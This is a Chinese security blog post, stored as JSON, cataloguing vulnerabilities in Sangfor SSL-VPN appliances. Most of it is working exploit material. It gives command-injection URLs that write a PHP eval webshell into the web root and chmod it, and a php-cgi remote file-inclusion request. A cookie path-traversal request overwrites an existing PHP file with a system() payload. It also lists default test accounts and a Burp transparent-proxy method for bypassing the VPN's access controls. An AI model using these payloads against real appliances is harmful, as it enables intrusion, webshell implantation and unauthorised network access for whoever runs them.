{"title":"Sangfor安全设备缺陷一览表.md","slug":"网安防御/安全厂商设备/深信服-Sangfor/Sangfor安全设备缺陷一览表","date":"2019-04-13T11:34:30.000Z","updated":"2022-03-29T05:39:02.682Z","url":"2019/4-13-57.html","path":"api/articles/2019/4-13-57.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413192122.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413192504.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413193836.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413195704.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413194528.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413195244.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413195527.png"],"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-Sangfor-AF\"><a href=\"#0x00-Sangfor-AF\" class=\"headerlink\" title=\"0x00 Sangfor AF\"></a>0x00 Sangfor AF</h4><h4 id=\"0x01-SangforSSL-VPN\"><a href=\"#0x01-SangforSSL-VPN\" class=\"headerlink\" title=\"0x01 SangforSSL-VPN\"></a>0x01 SangforSSL-VPN</h4><p>(1)-OpenSSL心脏出血漏洞 （较少）<br>(2)-远程代码执行（Version &lt;= M5.6）<br>(3)-Getshell漏洞（邮件服务器配置）<br>(4)-权限绕过</p>\n<p><strong>SSL-VPN版本查看：</strong><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /por/login_auth.csp?type=cs&amp;cli=ssl&amp;language=zh_CN&amp;rnd=26471778&amp;encrypt=1 HTTP/1.1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: SangforCS</span><br><span class=\"line\">Host: 183.230.46.100:4433</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413192122.png\" alt=\"WeiyiGeek.SSL-VPN版本\" title=\"\" class=\"\">\n                <p>WeiyiGeek.SSL-VPN版本</p>\n            </figure></p>\n<h5 id=\"1-常见利用\"><a href=\"#1-常见利用\" class=\"headerlink\" title=\"1.常见利用\"></a>1.常见利用</h5><p>默认测试账户：test、Guest</p>\n<p><br></p>\n<h5 id=\"2-远程代码执行\"><a href=\"#2-远程代码执行\" class=\"headerlink\" title=\"2.远程代码执行\"></a>2.远程代码执行</h5><p>影响范围：深信服版本 Version &lt;= M5.6</p>\n<p>缺陷代码：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//php exec函数</span></span><br><span class=\"line\">$args = $_REQUEST[<span class=\"string\">'cmd'</span>];</span><br><span class=\"line\"><span class=\"comment\">/*something here*/</span></span><br><span class=\"line\">exec(<span class=\"string\">\"tsutil -proxy $ip $args\"</span>, $output, $ret);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><br>利用POC:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http:<span class=\"comment\">//**.**.**.**:1000/cgi-bin/php-cgi/html/svpn.php -d 'cmd=phpinfo();</span></span><br><span class=\"line\"></span><br><span class=\"line\">/cgi-bin/php-cgi/html/svpnphp/_inc/commondef.php?-dallow_url_include=On -dauto_prepend_file=http:<span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#有 php-cgi 代码远程执行漏洞</span></span><br><span class=\"line\">http:<span class=\"comment\">//SSLVPN.SANGFOR.COM:1000/cgi-bin/php-cgi/html/daemon/tsproxy.php?cmd=ifconfig||echo%20'%3C?php%20eval($_POST[cmd]);?%3E'%20%3E/app/usr/sbin/webui/html/svpn.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//修改了</span></span><br><span class=\"line\">http:<span class=\"comment\">//SSLVPN.SANGFOR.COM:1000/cgi-bin/php-cgi/html/daemon/tsproxy.php?cmd=ifconfig||chmod 777 /app/usr/sbin/webui/html/svpn.php</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413192504.png\" alt=\"WeiyiGeek.远程代码执行\" title=\"\" class=\"\">\n                <p>WeiyiGeek.远程代码执行</p>\n            </figure></p>\n<p><br></p>\n<h5 id=\"3-Getshell漏洞（邮件服务器配置）\"><a href=\"#3-Getshell漏洞（邮件服务器配置）\" class=\"headerlink\" title=\"3.Getshell漏洞（邮件服务器配置）\"></a>3.Getshell漏洞（邮件服务器配置）</h5><p>漏洞利用前提：</p>\n<ul>\n<li>有登陆SSL VPN控制台的权限</li>\n<li>可以SSL VPN修改邮件服务器配置</li>\n</ul>\n<p>缺陷代码文件:sysCfgController.class.php 147行 [邮件服务器设置的发送测试邮件功能]<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sendTestMail</span><span class=\"params\">($SMTPServer, $SMTPPort, $DestAddr, $EmailTitle, $EnableCheckUsr=<span class=\"number\">0</span>, $EmailUser=<span class=\"string\">''</span>, $EmailPassword=<span class=\"string\">''</span>,$EmailFrom=<span class=\"string\">''</span>,$LanguageType=<span class=\"string\">'zh_CN'</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">\t\t</span>&#123;</span><br><span class=\"line\">      <span class=\"comment\">// 写入临时配置文件</span></span><br><span class=\"line\">      $conf_file = <span class=\"string\">'/tmp/testmail_'</span>.$_COOKIE[<span class=\"string\">'sinfor_session_id'</span>];</span><br><span class=\"line\">      $contents  = <span class=\"string\">\"[MAIL]\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"EnableEmailNotice = \\\"1\\\"\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"SMTPServer = \\\"$SMTPServer\\\"\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"SMTPPort = \\\"$SMTPPort\\\"\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"EnableCheckUsr = \\\"$EnableCheckUsr\\\"\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"EmailUser = \\\"$EmailUser\\\"\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"EmailPassword = \\\"$EmailPassword\\\"\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"EmailFrom = \\\"$EmailFrom\\\"\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"DestAddr = \\\"$DestAddr\\\"\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"EmailTitle = \\\"$EmailTitle\\\"\\n\"</span>;</span><br><span class=\"line\">      $contents .= <span class=\"string\">\"ContentsFile = \\\"/tmp/smtpsend_test.txt\\\"\\n\"</span>;</span><br><span class=\"line\">      @file_put_contents($conf_file, $contents);  <span class=\"comment\">#file_put_contents在file_exists前执行，而$conf_file来源于cookie参数sinfor_session_id</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!file_exists($conf_file))</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> FileException($conf_file);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#修改cookie sinfor_session_id为：</span></span><br><span class=\"line\">sinfor_session_id=W04EDB7D9DC3B2FAAD4A9DD6C23CE9B2/../../tmp/<span class=\"number\">1.</span>txt  <span class=\"comment\">#即可在/tmp/目录下创建一个1.txt文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Getshell向web根目录下写个php就行，新建的文件权限是-rw-------，也就是说WEB容器不能执行新建的文件</span></span><br><span class=\"line\"><span class=\"comment\">#为了突破这个问题，需要覆盖掉一个已存在的php文件，利用其x权限来达到getshell的目的；</span></span><br><span class=\"line\">EG：/app/usr/sbin/webui/html/appSsoApi.php</span><br><span class=\"line\"><span class=\"comment\">#将Cookies修改 </span></span><br><span class=\"line\">sinfor_session_id=W04EDB7D9DC3B2FAAD4A9DD6C23CE9B2/../../tmp/../../app/usr/sbin/webui/html/appSsoApi.php</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#验证请求</span></span><br><span class=\"line\">POST /cgi-bin/php-cgi/html/delegatemodule/HttpHandler.php?controler=SysCfg&amp;action=sendTestMail&amp;token=<span class=\"number\">72</span>c791a93959bf388db3af864c09bbee82f2d1a8 HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Referer: https:<span class=\"comment\">//***/html/tpl/mailMgt.html</span></span><br><span class=\"line\">Cookie: language=zh_CN; USER_CUSTOM_SETTING=<span class=\"number\">1460011919</span>; SESSID=C42EC5FBB05DCD23B13A3384C98E065DC8271CA9AC1B4F433557BC8C4FBC312; x-anti-csrf-</span><br><span class=\"line\">gcs=<span class=\"number\">72</span>DFC30A00E3FB9E; sinfor_session_id=W04EDB7D9DC3B2FAAD4A9DD6C23CE9B2/../../tmp/../../app/usr/sbin/webui/html/appSsoApi.php; </span><br><span class=\"line\">PHPSESSID=<span class=\"number\">870</span>a66816ba987171730e9b80753da82; x-act-flag-gcs=; usermrgstate=%<span class=\"number\">7</span>B%<span class=\"number\">22</span>params%<span class=\"number\">22</span>%<span class=\"number\">3</span>A%<span class=\"number\">7</span>B%<span class=\"number\">22</span>grpid%<span class=\"number\">22</span>%<span class=\"number\">3</span>A%<span class=\"number\">2238</span>%<span class=\"number\">22</span>%<span class=\"number\">2</span>C%<span class=\"number\">22</span>recflag%<span class=\"number\">22</span>%<span class=\"number\">3</span>A0%<span class=\"number\">2</span>C</span><br><span class=\"line\">%<span class=\"number\">22</span>filter%<span class=\"number\">22</span>%<span class=\"number\">3</span>A0%<span class=\"number\">7</span>D%<span class=\"number\">2</span>C%<span class=\"number\">22</span>pageparams%<span class=\"number\">22</span>%<span class=\"number\">3</span>A%<span class=\"number\">7</span>B%<span class=\"number\">22</span>start%<span class=\"number\">22</span>%<span class=\"number\">3</span>A0%<span class=\"number\">2</span>C%<span class=\"number\">22</span>limit%<span class=\"number\">22</span>%<span class=\"number\">3</span>A25%<span class=\"number\">7</span>D%<span class=\"number\">2</span>C%<span class=\"number\">22</span>otherparams%<span class=\"number\">22</span>%<span class=\"number\">3</span>A%<span class=\"number\">7</span>B%<span class=\"number\">22</span>searchtype%<span class=\"number\">22</span>%<span class=\"number\">3</span>A0%<span class=\"number\">2</span>C%<span class=\"number\">22</span>recflag</span><br><span class=\"line\">%<span class=\"number\">22</span>%<span class=\"number\">3</span>Afalse%<span class=\"number\">7</span>D%<span class=\"number\">7</span>D; hidecfg=%<span class=\"number\">7</span>B%<span class=\"number\">22</span>name%<span class=\"number\">22</span>%<span class=\"number\">3</span>Afalse%<span class=\"number\">2</span>C%<span class=\"number\">22</span>flag%<span class=\"number\">22</span>%<span class=\"number\">3</span>Afalse%<span class=\"number\">2</span>C%<span class=\"number\">22</span>note%<span class=\"number\">22</span>%<span class=\"number\">3</span>Afalse%<span class=\"number\">2</span>C%<span class=\"number\">22</span>expire%<span class=\"number\">22</span>%<span class=\"number\">3</span>Atrue%<span class=\"number\">2</span>C%<span class=\"number\">22</span>lastlogin_time%<span class=\"number\">22</span>%<span class=\"number\">3</span>Atrue%<span class=\"number\">2</span>C</span><br><span class=\"line\">%<span class=\"number\">22</span>phone%<span class=\"number\">22</span>%<span class=\"number\">3</span>Atrue%<span class=\"number\">2</span>C%<span class=\"number\">22</span>allocateip%<span class=\"number\">22</span>%<span class=\"number\">3</span>Atrue%<span class=\"number\">2</span>C%<span class=\"number\">22</span>other%<span class=\"number\">22</span>%<span class=\"number\">3</span>Afalse%<span class=\"number\">2</span>C%<span class=\"number\">22</span>state%<span class=\"number\">22</span>%<span class=\"number\">3</span>Afalse%<span class=\"number\">7</span>D</span><br><span class=\"line\"><span class=\"comment\">#下面是POC将下面的字符串写入了appSsoApi.php文件中</span></span><br><span class=\"line\">SMTPServer=<span class=\"meta\">&lt;?php</span> system(id);<span class=\"meta\">?&gt;</span>&amp;SMTPPort=<span class=\"number\">1</span>&amp;EmailUser=&amp;EmailPassword=&amp;EmailFrom=<span class=\"number\">1</span>&amp;LanguageType=zh_CN&amp;DestAddr=<span class=\"number\">1</span>&amp;EmailTitle=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h5 id=\"4-权限绕过\"><a href=\"#4-权限绕过\" class=\"headerlink\" title=\"4.权限绕过\"></a>4.权限绕过</h5><p>描述：绕过深信服SSL VPN访问权限控制利用burp,在SSL VPN链接服务端后会下发一个资源表给客户端;<br>图中的host字段就是VPN远端的服务器IP，port就是允许你访问的服务区端口号为22 (只允许你去访问10.x.x.x的22端口)<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413193836.png\" alt=\"WeiyiGeek.SSLVPN\" title=\"\" class=\"\">\n                <p>WeiyiGeek.SSLVPN</p>\n            </figure></p>\n<p>注意事项：可以修改服务器返回的IP和端口号(通过burp代理修改port范围为1-65535)来访问其它VPN远端资源,但是使用http代理后就不能访问L3VPN资源了L3VPN=TCP+UDP+ICMP<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413195704.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>解决方法：使用burp的invisible proxying<br>所谓的invisible proxying就是透明代理，通过出口设备将访问VPN的数据重定向给burp即可;<br><em>Q  :找谁重定向？</em><br>出口设备或者linux的iptables都可以，这里以出口设备DNAT为例<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413194528.png\" alt=\"WeiyiGeek.透明代理\" title=\"\" class=\"\">\n                <p>WeiyiGeek.透明代理</p>\n            </figure></p>\n<p>访问VPN的数据流变成如下流程：<br>hacker –&gt; 出口 –&gt; DNAT给burp（同时源IP转换为<strong>.</strong>.<strong>.</strong>） –&gt; burp处理 –&gt; 出口 –&gt; VPN设备<br>注意：burp和hacker主机不能为同一台,为同一台的话会出现数据环路</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里做实验的hacker机IP为**.**.**.**，burp主机**.**.**.**，网关为**.**.**.**，VPN设备IP假设为**.**.**.**</span><br><span class=\"line\"></span><br><span class=\"line\">那么在出口需要做：</span><br><span class=\"line\">1、源IP为**.**.**.** 的访问 **.**.**.** TCP443端口重定向到**.**.**.**的443端口</span><br><span class=\"line\"></span><br><span class=\"line\">2、代理**.**.**.** 访问 **.**.**.**的请求</span><br><span class=\"line\"></span><br><span class=\"line\">因为我这里 **.**.**.** 是假的所以要绑定下hosts，burp和windows主机都要绑定</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413195244.png\" alt=\"WeiyiGeek.Resolution\" title=\"\" class=\"\">\n                <p>WeiyiGeek.Resolution</p>\n            </figure>\n<p>登陆SSL试下发现burp正常工作,VPN登陆流程比较慢但可以登陆,可以看到端口范围已经被burp自动修改了<br>注：这里VPN登陆成功后需取消网关的DNAT策略,否则会因burp代理速度太慢导致VPN不可用;<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190413195527.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"安全设备","path":"api/categories/安全设备.json"},{"name":"漏洞利用","path":"api/categories/漏洞利用.json"}],"tags":[{"name":"Sangfor","path":"api/tags/Sangfor.json"}]}